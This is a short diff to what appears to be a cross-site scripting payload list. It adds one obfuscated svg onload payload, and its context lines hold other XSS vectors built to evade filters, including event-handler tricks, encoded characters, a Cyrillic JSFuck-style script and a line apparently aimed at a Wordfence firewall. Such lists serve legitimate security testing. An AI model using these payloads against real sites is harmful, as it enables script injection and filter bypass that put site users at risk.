@@ -2,6 +2,7 @@
 "><input%20onfocus=alert(1)%20autofocus>
 "><img src=x onerrora=confirm() onerror​=confirm(1)>
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](origin)%27>
 <svg onload​=alert&#0000000040"1")><””>
 <0 name="<svg/onload=alert(1)>">
 </ <a href="><svg/onload=alert(1)>">
@@ -1772,6 +1773,7 @@ Wordfence 7.4.2
 <lol/contenteditable/autofocus/onfocus="alert(1)">
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
 з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
 
 
 
